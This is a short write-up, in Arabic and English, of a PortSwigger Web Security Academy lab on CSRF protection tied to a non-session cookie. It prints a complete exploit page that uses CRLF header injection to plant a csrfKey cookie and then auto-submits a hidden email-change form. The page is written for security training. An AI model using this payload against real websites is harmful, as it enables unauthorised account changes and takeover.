# Lab : CSRF where token is tied to non-session cookies

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

- الفكره من الLab ده انك تستغل ان في ثغره CSRF ةتستغل ان parameter the email مصاب وتغير الايميل بس في مشكله اولها ان في CSRF Token and CSRF Cookies الاتنين مرتبطين ببعض مش بsession فا ممكن نتنتحج ان في نظام حمايه ليه لوحده و هما random بس ثابتين فا احنا ممكن ندور علي طريقه تانيه الا وهي استخدام ثغره كمان كمثال HTTP header injection

```bash
1. <html>
    <body>
        <h1>Hello World!</h1>
        <form action="https://0a29001b03b392988772b11500ad000d.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test12@test.ca">
            <input type="hidden" name="csrf" value="viH1W1pUDEG3N4jxaK8VyJZUNGGyBwPS">
        </form>
			<img src="https://0a29001b03b392988772b11500ad000d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=aYkMEH8HTmZ4NK2pxWf6tARUpDYrDCU5%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```
